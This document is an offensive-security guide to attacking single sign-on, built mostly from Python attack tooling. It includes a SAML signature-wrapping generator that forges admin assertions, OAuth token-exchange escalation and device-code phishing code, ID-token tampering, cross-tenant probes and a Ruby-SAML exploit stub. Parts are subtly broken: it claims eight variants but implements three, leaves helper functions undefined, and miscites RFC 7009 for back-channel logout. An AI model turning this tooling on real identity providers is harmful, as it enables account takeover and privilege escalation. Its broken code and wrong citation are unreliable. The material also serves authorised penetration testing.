# Advanced SSO Attacks

## Overview

Single Sign-On (SSO) implementations using SAML, OAuth 2.0, and OpenID Connect continue to be high-value targets. This document covers advanced attack techniques including all SAML signature wrapping variants, OAuth token exchange attacks, OIDC ID token manipulation, SSO provider confusion, cross-tenant attacks, and SSO logout bypass. Includes 2024-2025 CVEs and real-world exploitation chains.

**Key Sources**:
- https://guptadeepak.com/security-vulnerabilities-in-saml-oauth-2-0-openid-connect-and-jwt/
- https://www.obsidiansecurity.com/blog/sso-bypass-attack-techniques
- https://www.endorlabs.com/learn/cve-2025-47949-reveals-flaw-in-samlify-that-opens-door-to-saml-single-sign-on-bypass
- https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html

---

## 1. SAML Signature Wrapping (XSW) - All Variants

### 1.1 XSW Attack Theory

**Vulnerability**: XML Signature Wrapping exploits the disconnect between which XML element the signature validates and which element the application processes. The attacker moves the signed assertion and injects a malicious unsigned assertion that the SP processes instead.

### 1.2 All Eight XSW Variants

```
XSW1: Duplicate Response with modified assertion before signed Response
XSW2: Detached signature with evil assertion appended after signature
XSW3: Evil assertion added as sibling to original assertion in Response
XSW4: Original assertion wrapped inside evil assertion as child
XSW5: Modified copy of signed assertion; original moved to Extensions
XSW6: Original assertion moved into Signature value; evil copy replaces it
XSW7: Extensions element contains evil assertion, original signature preserved
XSW8: Object element in Signature contains original, evil assertion in Response
```

**XSW1 - Cloned Response**:
```xml
<!-- Attacker injects entire new Response wrapper -->
<Response>
  <!-- Evil unsigned assertion (SP processes this) -->
  <Assertion ID="evil">
    <Subject>
      <NameID>admin@target.com</NameID>
    </Subject>
  </Assertion>
  <!-- Original signed Response moved here -->
  <Response ID="original">
    <Assertion ID="legit">
      <Subject>
        <NameID>user@target.com</NameID>
      </Subject>
      <ds:Signature>
        <ds:Reference URI="#legit"/>
      </ds:Signature>
    </Assertion>
  </Response>
</Response>
```

**XSW3 - Sibling Assertion**:
```xml
<Response>
  <!-- Evil assertion (SP processes this) -->
  <Assertion ID="evil">
    <Subject>
      <NameID>admin@target.com</NameID>
    </Subject>
    <AttributeStatement>
      <Attribute Name="role">
        <AttributeValue>admin</AttributeValue>
      </Attribute>
    </AttributeStatement>
  </Assertion>
  <!-- Original signed assertion -->
  <Assertion ID="legit">
    <Subject>
      <NameID>user@target.com</NameID>
    </Subject>
    <ds:Signature>
      <ds:Reference URI="#legit"/>
    </ds:Signature>
  </Assertion>
</Response>
```

**XSW7 - Extensions Element**:
```xml
<Response>
  <Assertion ID="evil">
    <Subject>
      <NameID>admin@target.com</NameID>
    </Subject>
  </Assertion>
  <Extensions>
    <!-- Original signed assertion hidden in Extensions -->
    <Assertion ID="legit">
      <Subject>
        <NameID>user@target.com</NameID>
      </Subject>
      <ds:Signature>
        <ds:Reference URI="#legit"/>
      </ds:Signature>
    </Assertion>
  </Extensions>
</Response>
```

### 1.3 Automated XSW Testing

```python
#!/usr/bin/env python3
"""SAML XSW Attack Generator - All 8 Variants"""

import xml.etree.ElementTree as ET
from copy import deepcopy
import base64
import zlib

SAML_NS = 'urn:oasis:names:tc:SAML:2.0:assertion'
SAMLP_NS = 'urn:oasis:names:tc:SAML:2.0:protocol'
DS_NS = 'http://www.w3.org/2000/09/xmldsig#'

class XSWGenerator:
    """Generate all 8 XSW attack variants."""

    def __init__(self, saml_response_b64):
        decoded = base64.b64decode(saml_response_b64)
        try:
            decoded = zlib.decompress(decoded, -15)
        except:
            pass
        self.root = ET.fromstring(decoded.decode())
        self.original_xml = decoded.decode()

    def generate_all_variants(self, evil_nameid='admin@target.com'):
        """Generate all 8 XSW variants."""
        variants = {}
        for i in range(1, 9):
            method = getattr(self, f'_xsw{i}', None)
            if method:
                try:
                    variants[f'XSW{i}'] = method(evil_nameid)
                except Exception as e:
                    variants[f'XSW{i}'] = f'Error: {str(e)}'
        return variants

    def _xsw1(self, evil_nameid):
        """XSW1: Wrap original Response, prepend evil assertion."""
        root = deepcopy(self.root)
        wrapper = ET.Element(f'{{{SAMLP_NS}}}Response')

        evil_assertion = self._create_evil_assertion(evil_nameid)
        wrapper.append(evil_assertion)
        wrapper.append(root)

        return self._encode(wrapper)

    def _xsw3(self, evil_nameid):
        """XSW3: Add evil assertion as sibling."""
        root = deepcopy(self.root)
        evil_assertion = self._create_evil_assertion(evil_nameid)
        root.insert(0, evil_assertion)  # Insert before signed assertion
        return self._encode(root)

    def _xsw7(self, evil_nameid):
        """XSW7: Move original to Extensions, replace with evil."""
        root = deepcopy(self.root)

        # Find original assertion
        assertion = root.find(f'.//{{{SAML_NS}}}Assertion')
        if assertion is None:
            raise ValueError("No Assertion found")

        # Create Extensions element
        extensions = ET.SubElement(root, f'{{{SAMLP_NS}}}Extensions')
        extensions.append(deepcopy(assertion))

        # Replace original with evil
        root.remove(assertion)
        evil_assertion = self._create_evil_assertion(evil_nameid)
        root.insert(0, evil_assertion)

        return self._encode(root)

    def _create_evil_assertion(self, nameid):
        """Create a malicious assertion."""
        assertion = ET.Element(f'{{{SAML_NS}}}Assertion')
        assertion.set('ID', '_evil_assertion')
        assertion.set('Version', '2.0')

        subject = ET.SubElement(assertion, f'{{{SAML_NS}}}Subject')
        name_id = ET.SubElement(subject, f'{{{SAML_NS}}}NameID')
        name_id.text = nameid

        # Add admin role attribute
        attr_stmt = ET.SubElement(assertion, f'{{{SAML_NS}}}AttributeStatement')
        attr = ET.SubElement(attr_stmt, f'{{{SAML_NS}}}Attribute')
        attr.set('Name', 'role')
        attr_val = ET.SubElement(attr, f'{{{SAML_NS}}}AttributeValue')
        attr_val.text = 'admin'

        return assertion

    def _encode(self, element):
        """Encode XML element to base64 for SAML response."""
        xml_str = ET.tostring(element, encoding='unicode')
        return base64.b64encode(xml_str.encode()).decode()
```

### 1.4 Recent SAML CVEs (2024-2025)

| CVE | Library/Product | Description | Severity |
|-----|----------------|-------------|----------|
| CVE-2025-47949 | Samlify | Signature validation bypass | Critical |
| CVE-2024-45409 | Ruby-SAML | Forge SAML response, login as any user | Critical |
| CVE-2024-6800 | GitHub Enterprise Server | SAML SSO bypass | Critical |
| CVE-2024-6202 | HaloITSM | SAML user impersonation | Critical |
| CVE-2024-8698 | Keycloak | SAML signature position confusion | High |

**CVE-2024-45409 (Ruby-SAML) Exploitation**:
```python
"""
CVE-2024-45409: Ruby-SAML allows forging SAML responses
Affected: ruby-saml < 1.17.0
Impact: Authenticate as any user on GitLab and other Ruby-SAML SPs
"""

def exploit_cve_2024_45409(target_url, victim_email):
    """
    The vulnerability allows an attacker to craft a SAML response
    that passes signature validation but contains a different
    NameID than what was signed.
    """
    # Forge SAML response with victim's email
    forged_response = create_forged_saml_response(
        nameid=victim_email,
        # The bug is in how ruby-saml resolves the digest reference
        # allowing signature to validate on different element
    )

    # Submit to ACS endpoint
    resp = requests.post(
        f"{target_url}/users/auth/saml/callback",
        data={'SAMLResponse': forged_response}
    )
    return resp
```

---

## 2. OAuth Token Exchange Attacks

### 2.1 Token Exchange (RFC 8693) Exploitation

**Vulnerability**: OAuth 2.0 Token Exchange allows swapping one token type for another, which can be exploited for privilege escalation.

```python
#!/usr/bin/env python3
"""OAuth Token Exchange Attack Framework"""

import requests

class TokenExchangeAttacker:
    """Exploit OAuth 2.0 Token Exchange (RFC 8693) vulnerabilities."""

    def __init__(self, token_endpoint):
        self.token_endpoint = token_endpoint

    def test_token_exchange(self, subject_token, target_audience=None):
        """Test if token exchange is supported and exploitable."""
        exchange_params = {
            'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
            'subject_token': subject_token,
            'subject_token_type': 'urn:ietf:params:oauth:token-type:access_token',
        }

        # Test different requested token types
        token_types = [
            'urn:ietf:params:oauth:token-type:access_token',
            'urn:ietf:params:oauth:token-type:refresh_token',
            'urn:ietf:params:oauth:token-type:id_token',
            'urn:ietf:params:oauth:token-type:saml2',
            'urn:ietf:params:oauth:token-type:jwt',
        ]

        results = []
        for token_type in token_types:
            params = {**exchange_params, 'requested_token_type': token_type}
            if target_audience:
                params['audience'] = target_audience

            resp = requests.post(self.token_endpoint, data=params)
            results.append({
                'requested_type': token_type,
                'status': resp.status_code,
                'success': resp.status_code == 200,
                'response': resp.json() if resp.ok else resp.text[:200]
            })

        return results

    def escalate_via_audience(self, subject_token, audiences):
        """Try to exchange token for access to different services/audiences."""
        results = []
        for audience in audiences:
            resp = requests.post(self.token_endpoint, data={
                'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
                'subject_token': subject_token,
                'subject_token_type': 'urn:ietf:params:oauth:token-type:access_token',
                'audience': audience,
                'scope': 'openid profile email admin',
            })
            if resp.status_code == 200:
                results.append({
                    'audience': audience,
                    'new_token': resp.json().get('access_token'),
                    'scopes': resp.json().get('scope'),
                    'escalated': True
                })
        return results

    def impersonation_exchange(self, actor_token, subject_token):
        """
        Test impersonation via token exchange.
        Actor token is the caller, subject token is the user to impersonate.
        """
        resp = requests.post(self.token_endpoint, data={
            'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
            'subject_token': subject_token,
            'subject_token_type': 'urn:ietf:params:oauth:token-type:access_token',
            'actor_token': actor_token,
            'actor_token_type': 'urn:ietf:params:oauth:token-type:access_token',
        })
        return {
            'impersonation_possible': resp.status_code == 200,
            'response': resp.json() if resp.ok else resp.text[:200]
        }
```

### 2.2 OAuth Device Code Flow Exploitation

```python
class DeviceCodeFlowAttack:
    """Exploit OAuth Device Code flow for phishing."""

    def __init__(self, authorization_server):
        self.auth_server = authorization_server

    def initiate_device_flow(self, client_id, scope='openid profile email'):
        """Start a device code flow that victim will authorize."""
        resp = requests.post(f"{self.auth_server}/oauth/device/code", data={
            'client_id': client_id,
            'scope': scope,
        })

        if resp.status_code == 200:
            data = resp.json()
            return {
                'device_code': data['device_code'],
                'user_code': data['user_code'],
                'verification_uri': data['verification_uri'],
                'verification_uri_complete': data.get('verification_uri_complete'),
                'expires_in': data['expires_in'],
                'interval': data['interval'],
                'phishing_url': data.get('verification_uri_complete',
                    f"{data['verification_uri']}?user_code={data['user_code']}")
            }
        return None

    def poll_for_token(self, device_code, client_id, interval=5, timeout=300):
        """Poll for token after victim authorizes."""
        import time
        start = time.time()

        while time.time() - start < timeout:
            resp = requests.post(f"{self.auth_server}/oauth/token", data={
                'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
                'device_code': device_code,
                'client_id': client_id,
            })

            if resp.status_code == 200:
                return resp.json()  # Got the token

            error = resp.json().get('error')
            if error == 'authorization_pending':
                time.sleep(interval)
                continue
            elif error == 'slow_down':
                time.sleep(interval + 5)
                continue
            elif error in ('expired_token', 'access_denied'):
                return {'error': error}

        return {'error': 'timeout'}
```

---

## 3. OIDC ID Token Manipulation

### 3.1 ID Token Injection

**Vulnerability**: When applications improperly validate ID tokens, attackers can inject modified tokens.

```python
class OIDCTokenManipulator:
    """Manipulate OIDC ID tokens for authentication bypass."""

    def test_id_token_injection(self, target_url, id_token):
        """Test various ID token manipulation techniques."""
        import jwt

        # Decode without verification
        payload = jwt.decode(id_token, options={"verify_signature": False})
        header = jwt.get_unverified_header(id_token)

        manipulations = []

        # 1. Change subject (sub) claim
        modified = {**payload, 'sub': 'admin'}
        manipulations.append(('sub_manipulation', modified))

        # 2. Change email claim
        modified = {**payload, 'email': 'admin@target.com', 'email_verified': True}
        manipulations.append(('email_manipulation', modified))

        # 3. Change audience (aud) claim
        modified = {**payload, 'aud': 'admin-client'}
        manipulations.append(('aud_manipulation', modified))

        # 4. Add admin claims
        modified = {**payload, 'groups': ['admins'], 'roles': ['admin']}
        manipulations.append(('role_injection', modified))

        # 5. Change issuer
        modified = {**payload, 'iss': 'https://attacker-idp.com'}
        manipulations.append(('issuer_manipulation', modified))

        # 6. Extend expiration
        modified = {**payload, 'exp': 9999999999}
        manipulations.append(('exp_extension', modified))

        # 7. Nonce removal
        modified = {k: v for k, v in payload.items() if k != 'nonce'}
        manipulations.append(('nonce_removal', modified))

        return manipulations

    def test_id_token_as_access_token(self, api_url, id_token):
        """Test if ID token is accepted as access token."""
        resp = requests.get(api_url, headers={
            'Authorization': f'Bearer {id_token}'
        })
        return {
            'accepted': resp.status_code not in [401, 403],
            'response': resp.text[:200]
        }
```

### 3.2 OIDC Discovery Manipulation

**Vulnerability**: If the application dynamically fetches OIDC configuration, an attacker can redirect it to a malicious configuration.

```python
class OIDCDiscoveryAttack:
    """Exploit OIDC discovery endpoint manipulation."""

    def create_malicious_discovery(self, attacker_url):
        """Create a malicious OIDC discovery document."""
        return {
            "issuer": attacker_url,
            "authorization_endpoint": f"{attacker_url}/authorize",
            "token_endpoint": f"{attacker_url}/token",
            "userinfo_endpoint": f"{attacker_url}/userinfo",
            "jwks_uri": f"{attacker_url}/jwks",
            "response_types_supported": ["code", "id_token", "token"],
            "subject_types_supported": ["public"],
            "id_token_signing_alg_values_supported": ["RS256", "HS256", "none"],
            "scopes_supported": ["openid", "profile", "email"],
            "claims_supported": ["sub", "name", "email", "groups", "roles"],
        }

    def test_issuer_confusion(self, target_url, issuer_urls):
        """Test if application validates issuer against whitelist."""
        results = []
        for issuer in issuer_urls:
            # Try to initiate auth with different issuer
            resp = requests.get(f"{target_url}/auth/login", params={
                'issuer': issuer,
                'redirect_uri': f"{target_url}/callback",
            })
            results.append({
                'issuer': issuer,
                'accepted': resp.status_code == 302,
                'redirect_to': resp.headers.get('Location', '')
            })
        return results
```

---

## 4. SSO Provider Confusion

### 4.1 Multi-Provider Confusion

**Vulnerability**: Applications supporting multiple SSO providers may have inconsistent identity mapping, allowing one provider's user to access another provider's account.

```python
class SSOProviderConfusion:
    """Exploit SSO provider confusion vulnerabilities."""

    def test_cross_provider_identity(self, target_url):
        """
        Test if authenticating via different SSO providers
        with the same email results in the same or different accounts.
        """
        # Step 1: Register/Login via Google SSO
        google_session = self._authenticate_via_provider(
            target_url, 'google', 'victim@gmail.com'
        )

        # Step 2: Login via SAML/Corporate SSO with same email
        saml_session = self._authenticate_via_provider(
            target_url, 'saml', 'victim@gmail.com'
        )

        # Step 3: Compare sessions - do they map to same account?
        return {
            'google_user_id': google_session.get('user_id'),
            'saml_user_id': saml_session.get('user_id'),
            'same_account': google_session.get('user_id') == saml_session.get('user_id'),
            'vulnerability': 'Provider confusion allows account takeover'
                            if google_session.get('user_id') == saml_session.get('user_id')
                            else 'Accounts are separate'
        }

    def test_provider_downgrade(self, target_url, email):
        """Test if SSO enforcement can be bypassed by using a different provider."""
        providers = ['google', 'github', 'microsoft', 'saml', 'password']
        results = []

        for provider in providers:
            resp = requests.post(f"{target_url}/auth/login", json={
                'provider': provider,
                'email': email,
            })
            results.append({
                'provider': provider,
                'available': resp.status_code != 404,
                'bypasses_sso': resp.status_code == 200
            })

        return results
```

---

## 5. Cross-Tenant SSO Attacks

### 5.1 Multi-Tenant SSO Exploitation

**Vulnerability**: Multi-tenant applications with SSO may not properly isolate tenants, allowing cross-tenant access.

```python
class CrossTenantAttack:
    """Exploit cross-tenant SSO vulnerabilities."""

    def test_tenant_isolation(self, target_url, attacker_tenant, victim_tenant):
        """Test if SSO from one tenant grants access to another."""
        # Authenticate with attacker's tenant
        session = self._sso_login(target_url, attacker_tenant)

        # Try to access victim's tenant resources
        test_urls = [
            f"{target_url}/tenant/{victim_tenant}/dashboard",
            f"{target_url}/api/tenants/{victim_tenant}/users",
            f"{target_url}/api/tenants/{victim_tenant}/settings",
        ]

        results = []
        for url in test_urls:
            resp = requests.get(url, cookies=session.cookies)
            results.append({
                'url': url,
                'accessible': resp.status_code not in [401, 403, 404],
                'cross_tenant': True
            })

        return results

    def test_tenant_header_injection(self, target_url, session):
        """Test if tenant can be changed via headers."""
        tenant_headers = [
            {'X-Tenant-ID': 'victim-tenant'},
            {'X-Organization': 'victim-org'},
            {'X-Tenant': 'victim'},
            {'X-Account-ID': 'victim-account'},
            {'Host': 'victim.target.com'},
            {'Origin': 'https://victim.target.com'},
        ]

        results = []
        for headers in tenant_headers:
            resp = requests.get(
                f"{target_url}/api/me",
                headers=headers,
                cookies=session.cookies
            )
            results.append({
                'headers': headers,
                'status': resp.status_code,
                'tenant_switched': resp.status_code == 200
            })

        return results

    def _sso_login(self, target_url, tenant):
        """Perform SSO login for a specific tenant."""
        session = requests.Session()
        session.get(f"{target_url}/auth/sso/{tenant}")
        return session
```

---

## 6. SSO Logout Bypass

### 6.1 Single Logout (SLO) Bypass

**Vulnerability**: Flawed SSO logout implementations allow session persistence after logout.

```python
class SSOLogoutBypass:
    """Test SSO logout bypass vulnerabilities."""

    def test_logout_completeness(self, target_url, session):
        """Test if all sessions are properly terminated on logout."""
        # Capture multiple session tokens
        session_tokens = {
            'web_session': session.cookies.get('session'),
            'api_token': session.cookies.get('api_token'),
            'refresh_token': session.cookies.get('refresh_token'),
        }

        # Perform logout
        requests.post(f"{target_url}/logout", cookies=session.cookies)

        # Test each token still works
        results = []
        for token_name, token_value in session_tokens.items():
            if token_value:
                resp = requests.get(
                    f"{target_url}/api/me",
                    cookies={token_name.replace('_token', ''): token_value},
                    headers={'Authorization': f'Bearer {token_value}'}
                )
                results.append({
                    'token': token_name,
                    'still_valid': resp.status_code == 200,
                    'vulnerability': 'Session not invalidated' if resp.status_code == 200 else None
                })

        return results

    def test_back_channel_logout(self, target_url, session):
        """Test if back-channel logout notification is properly handled."""
        # After IdP logout, check if SP session persists
        # This tests OIDC Back-Channel Logout (RFC 7009)

        # Step 1: Login and get session
        # Step 2: Simulate IdP back-channel logout notification
        logout_token = self._create_logout_token(session)

        resp = requests.post(
            f"{target_url}/oidc/backchannel-logout",
            data={'logout_token': logout_token}
        )

        # Step 3: Test if session is still valid
        check = requests.get(f"{target_url}/api/me", cookies=session.cookies)

        return {
            'logout_endpoint_exists': resp.status_code != 404,
            'logout_accepted': resp.status_code == 200,
            'session_still_valid': check.status_code == 200,
            'vulnerability': 'Back-channel logout not implemented or broken'
                            if check.status_code == 200 else None
        }

    def test_saml_slo_bypass(self, target_url, session):
        """Test SAML Single Logout bypass."""
        bypass_techniques = [
            # Direct endpoint access after logout
            {'method': 'direct_access', 'test': lambda: requests.get(
                f"{target_url}/dashboard", cookies=session.cookies)},
            # Use cached session ID
            {'method': 'cached_session', 'test': lambda: requests.get(
                f"{target_url}/api/me",
                cookies={'JSESSIONID': session.cookies.get('JSESSIONID')})},
            # Replay SAML assertion
            {'method': 'assertion_replay', 'test': lambda: requests.post(
                f"{target_url}/saml/acs",
                data={'SAMLResponse': session.last_saml_response})},
        ]

        results = []
        for technique in bypass_techniques:
            resp = technique['test']()
            results.append({
                'technique': technique['method'],
                'still_authenticated': resp.status_code == 200
            })

        return results
```

---

## 7. Testing Checklist

```
# SAML Attacks
[ ] Test all 8 XSW variants
[ ] Test signature removal
[ ] Test assertion replay
[ ] Test XXE in SAML messages
[ ] Test SAML assertion injection
[ ] Test NameID format manipulation
[ ] Test InResponseTo validation
[ ] Test Conditions/NotOnOrAfter bypass
[ ] Test SP metadata manipulation
[ ] Test ACS URL manipulation

# OAuth Attacks
[ ] Test token exchange escalation
[ ] Test device code flow phishing
[ ] Test authorization code injection
[ ] Test PKCE bypass/downgrade
[ ] Test scope escalation during exchange
[ ] Test token confusion (ID vs access)

# OIDC Attacks
[ ] Test issuer confusion
[ ] Test ID token manipulation
[ ] Test nonce validation
[ ] Test discovery endpoint manipulation
[ ] Test claims injection

# SSO Provider Attacks
[ ] Test cross-provider identity confusion
[ ] Test provider downgrade
[ ] Test cross-tenant access
[ ] Test tenant header injection
[ ] Test logout completeness
[ ] Test back-channel logout
[ ] Test SAML SLO bypass
```

---

## References

- OWASP SAML Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html
- CVE-2024-45409 Ruby-SAML: https://www.obsidiansecurity.com/blog/sso-bypass-attack-techniques
- CVE-2025-47949 Samlify: https://www.endorlabs.com/learn/cve-2025-47949-reveals-flaw-in-samlify-that-opens-door-to-saml-single-sign-on-bypass
- SSO Protocol Security 2025: https://guptadeepak.com/security-vulnerabilities-in-saml-oauth-2-0-openid-connect-and-jwt/
- CVE-2024-6800 GitHub Enterprise: https://nvd.nist.gov/vuln/detail/CVE-2024-6800
- CVE-2024-8698 Keycloak: https://www.commandlink.com/cve-2024-8698-keycloak-vulnerability-exposes-saml-authentication-to-bypass-and-privilege-escalation/
- OAuth 2.0 Token Exchange RFC 8693: https://datatracker.ietf.org/doc/html/rfc8693
- OIDC Back-Channel Logout: https://openid.net/specs/openid-connect-backchannel-1_0.html
